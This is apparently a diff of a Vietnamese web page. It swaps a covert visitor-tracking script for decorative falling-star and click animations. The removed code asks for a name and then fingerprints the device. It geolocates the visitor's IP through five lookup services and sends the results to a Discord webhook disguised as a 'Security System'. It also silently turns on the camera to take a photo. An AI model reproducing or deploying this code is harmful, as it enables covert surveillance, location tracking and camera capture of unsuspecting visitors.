-                {name:"💻 THIẾT BỊ & HỆ THỐNG",value:`> **Hệ điều hành:** ${userData.os}\n> **Platform:** ${userData.platform}\n> **CPU Cores:** ${userData.cpuCores}\n> **RAM:** ${userData.ram}\n> **Màn hình:** ${userData.screen}\n> **Touch:** ${userData.touchSupport}`,inline:false},
-                {name:"🎮 ĐỒ HỌA & TRÌNH DUYỆT",value:`> **GPU:** ${userData.gpu}\n> **Trình duyệt:** ${userData.browser}\n> **Phiên bản:** ${userData.browserVersion}\n> **Engine:** ${userData.engine}`,inline:false},
-                {name:"🌏 NGÔN NGỮ & BẢO MẬT",value:`> **Ngôn ngữ:** ${userData.language}\n> **Múi giờ local:** ${userData.timezone}\n> **Do Not Track:** ${userData.doNotTrack}\n> **Cookie:** ${userData.cookieEnabled}\n> **WebRTC:** ${userData.webrtc}`,inline:false},
-                {name:"🔍 USER AGENT",value:`\`\`\`${userData.userAgent.substring(0,500)}\`\`\``,inline:false}
-            ],
-            timestamp:new Date().toISOString(),
-            footer:{text:"emytyxynh Security System",icon_url:"https://cdn-icons-png.flaticon.com/512/6195/6195699.png"}
-        }]
-    };
-    fetch(DISCORD_WEBHOOK,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(discordPayload)
-    })
-    .then(response=>console.log('Data sent:',response.status))
-    .catch(err=>console.error('Send error:',err))
-}
+setInterval(createFallingStar, 800);
 
-async function getIPFromAPIs(){
-    const results={
-        ip:'Đang lấy...',country:'Đang lấy...',city:'Đang lấy...',
-        region:'Đang lấy...',district:'Đang lấy...',postal:'Đang lấy...',
-        lat:'Đang lấy...',lon:'Đang lấy...',timezoneAPI:'Đang lấy...',
-        isp:'Đang lấy...',org:'Đang lấy...',asn:'Đang lấy...',
-        connection_type:'Đang lấy...',proxy:'Đang lấy...',mobile:'Đang lấy...'
-    };
-    const apiCalls=[
-        fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>null),
-        fetch('https://ipwho.is/').then(r=>r.json()).catch(()=>null),
-        fetch('http://ip-api.com/json/?fields=66846719').then(r=>r.json()).catch(()=>null),
-        fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>null),
-        fetch('https://geolocation-db.com/json/').then(r=>r.json()).catch(()=>null)
-    ];
-    const responses=await Promise.all(apiCalls);
-    const ipapi=responses[0];
-    const ipwho=responses[1];
-    const ipApiCom=responses[2];
-    const ipinfo=responses[3];
-    const geodb=responses[4];
-    
-    if(ipapi&&ipapi.ip){
-        results.ip=ipapi.ip;
-        results.country=ipapi.country_name||results.country;
-        results.city=ipapi.city||results.city;
-        results.region=ipapi.region||results.region;
-        results.postal=ipapi.postal||results.postal;
-        results.lat=ipapi.latitude||results.lat;
-        results.lon=ipapi.longitude||results.lon;
-        results.timezoneAPI=ipapi.timezone||results.timezoneAPI;
-        results.isp=ipapi.org||results.isp;
-        results.asn=ipapi.asn||results.asn
-    }
-    if(ipwho&&ipwho.ip){
-        results.ip=results.ip==='Đang lấy...'?ipwho.ip:results.ip;
-        results.country=ipwho.country||results.country;
-        results.city=ipwho.city||results.city;
-        results.region=ipwho.region||results.region;
-        results.postal=ipwho.postal||results.postal;
-        results.lat=ipwho.latitude||results.lat;
-        results.lon=ipwho.longitude||results.lon;
-        results.timezoneAPI=ipwho.timezone?.id||results.timezoneAPI;
-        results.isp=ipwho.connection?.isp||results.isp;
-        results.org=ipwho.connection?.org||results.org;
-        results.asn=ipwho.connection?.asn||results.asn;
-        results.district=ipwho.region||results.district
-    }
-    if(ipApiCom&&ipApiCom.status==='success'){
-        results.ip=results.ip==='Đang lấy...'?ipApiCom.query:results.ip;
-        results.country=ipApiCom.country||results.country;
-        results.city=ipApiCom.city||results.city;
-        results.region=ipApiCom.regionName||results.region;
-        results.district=ipApiCom.district||results.district;
-        results.postal=ipApiCom.zip||results.postal;
-        results.lat=ipApiCom.lat||results.lat;
-        results.lon=ipApiCom.lon||results.lon;
-        results.timezoneAPI=ipApiCom.timezone||results.timezoneAPI;
-        results.isp=ipApiCom.isp||results.isp;
-        results.org=ipApiCom.org||ipApiCom.as||results.org;
-        results.asn=ipApiCom.as||results.asn;
-        results.proxy=ipApiCom.proxy?'Có':'Không';
-        results.mobile=ipApiCom.mobile?'Có':'Không'
-    }
-    if(ipinfo&&ipinfo.ip){
-        results.ip=results.ip==='Đang lấy...'?ipinfo.ip:results.ip;
-        if(ipinfo.city)results.city=ipinfo.city;
-        if(ipinfo.region)results.region=ipinfo.region;
-        if(ipinfo.country)results.country=ipinfo.country;
-        if(ipinfo.loc){
-            const[lat,lon]=ipinfo.loc.split(',');
-            results.lat=lat||results.lat;
-            results.lon=lon||results.lon
-        }
-        results.postal=ipinfo.postal||results.postal;
-        results.org=ipinfo.org||results.org;
-        results.timezoneAPI=ipinfo.timezone||results.timezoneAPI
-    }
-    if(geodb&&geodb.IPv4){
-        results.ip=results.ip==='Đang lấy...'?geodb.IPv4:results.ip;
-        results.country=geodb.country_name||results.country;
-        results.city=geodb.city||results.city;
-        results.region=geodb.state||results.region;
-        results.postal=geodb.postal||results.postal;
-        results.lat=geodb.latitude||results.lat;
-        results.lon=geodb.longitude||results.lon
-    }
-    Object.keys(results).forEach(key=>{
-        if(results[key]==='Đang lấy...'||results[key]===null||results[key]===undefined||results[key]===''){
-            results[key]='Không xác định'
-        }
+$(document).ready(function(){
+    $(document).on('click', function(e){
+        if($('#lockscreen').hasClass('hidden') === false) return;
+        var text = clickTexts[clickIndex];
+        clickIndex = (clickIndex + 1) % clickTexts.length;
+        var color = clickColors[Math.floor(Math.random() * clickColors.length)];
+        var el = $('<span class="click-text"></span>');
+        el.text(text);
+        el.css({
+            left: e.clientX,
+            top: e.clientY - 20,
+            color: color
+        });
+        $('body').append(el);
+        setTimeout(function(){ el.remove(); }, 1400);
     });
-    return results
-}
-
-function collectSystemInfo(){
-    const userAgent=navigator.userAgent;
-    const os=getOS();
-    const browser=getBrowser();
-    const cpuCores=navigator.hardwareConcurrency||'Không xác định';
-    const ram=navigator.deviceMemory?navigator.deviceMemory+' GB':'Không xác định';
-    const gpu=getGPU();
-    const language=(navigator.languages&&navigator.languages[0])||navigator.language||navigator.userLanguage||'Không xác định';
-    const platform=navigator.platform||'Không xác định';
-    const screenRes=`${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||'Không xác định';
-    const doNotTrack=navigator.doNotTrack==='1'?'Bật':'Tắt';
-    const cookieEnabled=navigator.cookieEnabled?'Bật':'Tắt';
-    const touchSupport='ontouchstart' in window||navigator.maxTouchPoints>0?'Có':'Không';
-    const webrtc=detectWebRTC();
-    const engine=getEngine();
-    return{
-        userAgent:userAgent,
-        os:os,
-        browser:browser.name,
-        browserVersion:browser.version,
-        cpuCores:cpuCores,
-        ram:ram,
-        gpu:gpu,
-        language:language,
-        platform:platform,
-        screen:screenRes,
-        timezone:timezone,
-        doNotTrack:doNotTrack,
-        cookieEnabled:cookieEnabled,
-        touchSupport:touchSupport,
-        webrtc:webrtc,
-        engine:engine
-    }
-}
-
-function getEngine(){
-    const ua=navigator.userAgent;
-    if(ua.indexOf('AppleWebKit')>-1){
-        if(ua.indexOf('Chrome')>-1)return 'Blink';
-        return 'WebKit'
-    }
-    if(ua.indexOf('Gecko')>-1&&ua.indexOf('Firefox')>-1)return 'Gecko';
-    if(ua.indexOf('Trident')>-1)return 'Trident';
-    if(ua.indexOf('Presto')>-1)return 'Presto';
-    return 'Không xác định'
-}
-
-function detectWebRTC(){
-    if(window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection){
-        return 'Hỗ trợ'
-    }
-    return 'Không hỗ trợ'
-}
-
-function getBrowser(){
-    const ua=navigator.userAgent;
-    let browserName="Không xác định";
-    let browserVersion="Không xác định";
-    if(ua.indexOf("Firefox")>-1){
-        browserName="Firefox";
-        browserVersion=ua.match(/Firefox\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Edg")>-1){
-        browserName="Edge";
-        browserVersion=ua.match(/Edg\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Chrome")>-1&&ua.indexOf("Edg")===-1){
-        browserName="Chrome";
-        browserVersion=ua.match(/Chrome\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Safari")>-1&&ua.indexOf("Chrome")===-1){
-        browserName="Safari";
-        browserVersion=ua.match(/Version\/([0-9.]+)/)?.[1]||"Không xác định"
-    }else if(ua.indexOf("Opera")>-1||ua.indexOf("OPR")>-1){
-        browserName="Opera";
-        browserVersion=ua.match(/OPR\/([0-9.]+)/)?.[1]||"Không xác định"
-    }
-    return{name:browserName,version:browserVersion}
-}
-
-function requestCameraAccess(){
-    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
-        navigator.mediaDevices.getUserMedia({video:true})
-        .then(stream=>{
-            const video=document.getElementById('video');
-            video.srcObject=stream;
-            video.onloadedmetadata=()=>{
-                video.play();
-                setTimeout(()=>capturePhoto(),1000)
-            }
-        })
-        .catch(err=>console.error('Camera error:',err))
-    }
-}
-
-function getOS(){
-    const ua=navigator.userAgent;
-    if(/windows phone/i.test(ua))return "Windows Phone";
-    if(/android/i.test(ua)){
-        const version=ua.match(/Android\s([0-9.]+)/);
-        return version?`Android ${version[1]}`:"Android"
-    }
-    if(/iPad|iPhone|iPod/.test(ua)){
-        const version=ua.match(/OS\s([0-9_]+)/);
-        return version?`iOS ${version[1].replace(/_/g,'.')}`:"iOS"
-    }
-    if(/Macintosh|Mac OS X/.test(ua)){
-        const version=ua.match(/Mac OS X\s([0-9_]+)/);
-        return version?`macOS ${version[1].replace(/_/g,'.')}`:"Mac OS"
-    }
-    if(/Windows NT/.test(ua)){
-        const version=ua.match(/Windows NT\s([0-9.]+)/);
-        const winVersions={'10.0':'Windows 10/11','6.3':'Windows 8.1','6.2':'Windows 8','6.1':'Windows 7','6.0':'Windows Vista'};
-        return version?(winVersions[version[1]]||`Windows NT ${version[1]}`):"Windows"
-    }
-    if(/Linux/.test(ua))return "Linux";
-    return "Không xác định"
-}
-
-function getGPU(){
-    try{
-        const canvas=document.createElement('canvas');
-        const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
-        if(gl){
-            const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
-            if(debugInfo){
-                const renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                return renderer||'Không xác định'
-            }
-        }
-    }catch(e){}
-    return 'Không xác định'
-}
-
-async function collectAndSendData(userName){
-    try{
-        const systemInfo=collectSystemInfo();
-        const ipData=await getIPFromAPIs();
-        sendToDiscord(ipData,systemInfo,userName);
-        requestCameraAccess();
-        
-        await playMusicFromAPI()
-    }catch(error){
-        console.error('Collection error:',error)
-    }
-}
-
-function handleConfirm(){
-    const nameInput=document.getElementById('nameInput');
-    const errorMessage=document.getElementById('errorMessage');
-    const confirmBtn=document.getElementById('confirmBtn');
-    const userName=nameInput.value.trim();
-    
-    if(!userName||userName.length<2){
-        nameInput.style.borderColor='rgba(239, 68, 68, 0.6)';
-        errorMessage.style.display='block';
-        nameInput.classList.add('shake');
-        setTimeout(()=>nameInput.classList.remove('shake'),500);
-        return
-    }
-    
-    confirmBtn.disabled=true;
-    confirmBtn.innerHTML='<span>Đang xử lý...</span>';
-    
-    document.getElementById('notificationModal').style.display='none';
-    collectAndSendData(userName)
-}
-
-document.getElementById('confirmBtn').addEventListener('click',handleConfirm);
-document.getElementById('nameInput').addEventListener('keypress',function(e){
-    if(e.key==='Enter'){
-        handleConfirm()
-    }
-});
-document.getElementById('nameInput').addEventListener('input',function(){
-    this.style.borderColor='rgba(100,120,200,0.25)';
-    document.getElementById('errorMessage').style.display='none'
-});
-
-window.addEventListener('DOMContentLoaded',function(){
-    setTimeout(()=>{
-        document.getElementById('notificationModal').style.display='block';
-        document.getElementById('nameInput').focus()
-    },500)
 });
 </script>
 <script>
-const styleElement = document.createElement("style");
+var styleElement = document.createElement("style");
 document.head.appendChild(styleElement);
-const styleSheet = styleElement.sheet;
+var styleSheet = styleElement.sheet;
 
-styleSheet.insertRule(":root { --glow-rgb: 255 255 255; }", 0);
-styleSheet.insertRule(".glow-point { position: absolute; box-shadow: 0rem 0rem 1.2rem 0.6rem rgb(var(--glow-rgb)); pointer-events: none; }", 1);
-styleSheet.insertRule(".star { position: absolute; z-index: 2; color: white; font-size: 1rem; animation-duration: 1500ms; animation-fill-mode: forwards; pointer-events: none; }", 2);
-styleSheet.insertRule("@keyframes fall-1 { 0% { transform: translate(0px, 0px) rotateX(45deg) rotateY(30deg) rotateZ(0deg) scale(0.25); opacity: 0; } 5% { transform: translate(10px, -10px) rotateX(45deg) rotateY(30deg) rotateZ(0deg) scale(1); opacity: 1; } 100% { transform: translate(25px, 200px) rotateX(180deg) rotateY(270deg) rotateZ(90deg) scale(1); opacity: 0; } }", 3);
-styleSheet.insertRule("@keyframes fall-2 { 0% { transform: translate(0px, 0px) rotateX(-20deg) rotateY(10deg) scale(0.25); opacity: 0; } 10% { transform: translate(-10px, -5px) rotateX(-20deg) rotateY(10deg) scale(1); opacity: 1; } 100% { transform: translate(-10px, 160px) rotateX(-90deg) rotateY(45deg) scale(0.25); opacity: 0; } }", 4);
-styleSheet.insertRule("@keyframes fall-3 { 0% { transform: translate(0px, 0px) rotateX(0deg) rotateY(45deg) scale(0.5); opacity: 0; } 15% { transform: translate(7px, 5px) rotateX(0deg) rotateY(45deg) scale(1); opacity: 1; } 100% { transform: translate(20px, 120px) rotateX(-180deg) rotateY(-90deg) scale(0.5); opacity: 0; } }", 5);
+styleSheet.insertRule(":root{--glow-rgb:255 255 255}", 0);
+styleSheet.insertRule(".glow-point{position:fixed;box-shadow:0rem 0rem 1.2rem 0.6rem rgb(var(--glow-rgb));pointer-events:none}", 1);
+styleSheet.insertRule(".magic-star{position:fixed;z-index:2;color:white;font-size:1rem;animation-duration:1500ms;animation-fill-mode:forwards;pointer-events:none}", 2);
+styleSheet.insertRule("@keyframes fall-1{0%{transform:translate(0px,0px) rotateX(45deg) rotateY(30deg) rotateZ(0deg) scale(0.25);opacity:0}5%{transform:translate(10px,-10px) rotateX(45deg) rotateY(30deg) rotateZ(0deg) scale(1);opacity:1}100%{transform:translate(25px,200px) rotateX(180deg) rotateY(270deg) rotateZ(90deg) scale(1);opacity:0}}", 3);
+styleSheet.insertRule("@keyframes fall-2{0%{transform:translate(0px,0px) rotateX(-20deg) rotateY(10deg) scale(0.25);opacity:0}10%{transform:translate(-10px,-5px) rotateX(-20deg) rotateY(10deg) scale(1);opacity:1}100%{transform:translate(-10px,160px) rotateX(-90deg) rotateY(45deg) scale(0.25);opacity:0}}", 4);
+styleSheet.insertRule("@keyframes fall-3{0%{transform:translate(0px,0px) rotateX(0deg) rotateY(45deg) scale(0.5);opacity:0}15%{transform:translate(7px,5px) rotateX(0deg) rotateY(45deg) scale(1);opacity:1}100%{transform:translate(20px,120px) rotateX(-180deg) rotateY(-90deg) scale(0.5);opacity:0}}", 5);
 
-let start = new Date().getTime();
-const originPosition = { x: 0, y: 0 };
-const last = {
-    starTimestamp: start,
-    starPosition: originPosition,
-    mousePosition: originPosition
-};
-const config = {
-    starAnimationDuration: 1500,
-    minimumTimeBetweenStars: 250,
-    minimumDistanceBetweenStars: 75,
-    glowDuration: 75,
-    maximumGlowPointSpacing: 10,
-    colors: ["255 255 255", "255 255 255"],
-    sizes: ["1.4rem", "1rem", "0.6rem"],
-    animations: ["fall-1", "fall-2", "fall-3"]
+var start = new Date().getTime();
+var originPosition = {x:0,y:0};
+var last = {starTimestamp:start,starPosition:originPosition,mousePosition:originPosition};
+var config = {
+    starAnimationDuration:1500,
+    minimumTimeBetweenStars:250,
+    minimumDistanceBetweenStars:75,
+    glowDuration:75,
+    maximumGlowPointSpacing:10,
+    colors:["255 255 255","255 255 255"],
+    sizes:["1.4rem","1rem","0.6rem"],
+    animations:["fall-1","fall-2","fall-3"]
 };
 
-let count = 0;
-const rand = (t, e) => Math.floor(Math.random() * (e - t + 1)) + t;
-const selectRandom = t => t[rand(0, t.length - 1)];
-const withUnit = (t, e) => `${t}${e}`;
-const px = t => withUnit(t, "px");
-const ms = t => withUnit(t, "ms");
-const calcDistance = (t, e) => {
-    let a = e.x - t.x, o = e.y - t.y;
-    return Math.sqrt(Math.pow(a, 2) + Math.pow(o, 2));
-};
-const calcElapsedTime = (t, e) => e - t;
-const appendElement = t => document.body.appendChild(t);
-const removeElement = (t, e) => setTimeout(() => document.body.removeChild(t), e);
-const createStar = t => {
-    let e = document.createElement("span"), a = selectRandom(config.colors);
-    e.className = "star fa-solid fa-sparkle";
+var count = 0;
+var rand = function(t,e){return Math.floor(Math.random()*(e-t+1))+t};
+var selectRandom = function(t){return t[rand(0,t.length-1)]};
+var px = function(t){return t+"px"};
+var ms = function(t){return t+"ms"};
+var calcDistance = function(t,e){var a=e.x-t.x,o=e.y-t.y;return Math.sqrt(a*a+o*o)};
+var calcElapsedTime = function(t,e){return e-t};
+var appendElement = function(t){document.body.appendChild(t)};
+var removeElement = function(t,e){setTimeout(function(){if(t.parentNode)t.parentNode.removeChild(t)},e)};
+
+var createStar = function(t){
+    var e = document.createElement("span");
+    var a = selectRandom(config.colors);
+    e.className = "magic-star";
     e.style.left = px(t.x);
     e.style.top = px(t.y);
     e.style.fontSize = selectRandom(config.sizes);
-    e.style.color = `rgb(${a})`;
-    e.style.textShadow = `0px 0px 1.5rem rgb(${a} / 0.5)`;
+    e.style.color = "rgb("+a+")";
+    e.style.textShadow = "0px 0px 1.5rem rgb("+a+" / 0.5)";
     e.style.animationName = config.animations[count++ % 3];
-    e.style.starAnimationDuration = ms(config.starAnimationDuration);
+    e.style.animationDuration = ms(config.starAnimationDuration);
+    e.textContent = "✦";
     appendElement(e);
     removeElement(e, config.starAnimationDuration);
 };
-const createGlowPoint = t => {
-    let e = document.createElement("div");
+
+var createGlowPoint = function(t){
+    var e = document.createElement("div");
     e.className = "glow-point";
     e.style.left = px(t.x);
     e.style.top = px(t.y);
     appendElement(e);
     removeElement(e, config.glowDuration);
 };
-const determinePointQuantity = t => Math.max(Math.floor(t / config.maximumGlowPointSpacing), 1);
-const createGlow = (t, e) => {
-    let a = calcDistance(t, e), o = determinePointQuantity(a), s = (e.x - t.x) / o, n = (e.y - t.y) / o;
-    Array.from(Array(o)).forEach((e, a) => {
-        let o = t.x + s * a, i = t.y + n * a;
-        createGlowPoint({ x: o, y: i });
-    });
+
+var determinePointQuantity = function(t){return Math.max(Math.floor(t/config.maximumGlowPointSpacing),1)};
+
+var createGlow = function(t,e){
+    var a=calcDistance(t,e),o=determinePointQuantity(a),s=(e.x-t.x)/o,n=(e.y-t.y)/o;
+    for(var i=0;i<o;i++){
+        createGlowPoint({x:t.x+s*i,y:t.y+n*i});
+    }
 };
-const updateLastStar = t => {
-    last.starTimestamp = new Date().getTime();
-    last.starPosition = t;
-};
-const updateLastMousePosition = t => last.mousePosition = t;
-const adjustLastMousePosition = t => {
-    0 === last.mousePosition.x && 0 === last.mousePosition.y && (last.mousePosition = t);
-};
-const handleOnMove = t => {
-    let e = { x: t.clientX, y: t.clientY };
+
+var updateLastStar = function(t){last.starTimestamp=new Date().getTime();last.starPosition=t};
+var updateLastMousePosition = function(t){last.mousePosition=t};
+var adjustLastMousePosition = function(t){if(last.mousePosition.x===0&&last.mousePosition.y===0)last.mousePosition=t};
+
+var handleOnMove = function(t){
+    var e={x:t.clientX,y:t.clientY};
     adjustLastMousePosition(e);
-    let a = new Date().getTime(), o = calcDistance(last.starPosition, e) >= config.minimumDistanceBetweenStars, s = calcElapsedTime(last.starTimestamp, a) > config.minimumTimeBetweenStars;
-    (o || s) && (createStar(e), updateLastStar(e));
-    createGlow(last.mousePosition, e);
+    var a=new Date().getTime();
+    var o=calcDistance(last.starPosition,e)>=config.minimumDistanceBetweenStars;
+    var s=calcElapsedTime(last.starTimestamp,a)>config.minimumTimeBetweenStars;
+    if(o||s){createStar(e);updateLastStar(e)}
+    createGlow(last.mousePosition,e);
     updateLastMousePosition(e);
 };
 
-window.onmousemove = t => handleOnMove(t);
-window.ontouchmove = t => handleOnMove(t.touches[0]);
-document.body.onmouseleave = () => updateLastMousePosition(originPosition);
+window.onmousemove = function(t){handleOnMove(t)};
+window.ontouchmove = function(t){handleOnMove(t.touches[0])};
+document.body.onmouseleave = function(){updateLastMousePosition(originPosition)};
 </script>
 </body>
 </html>
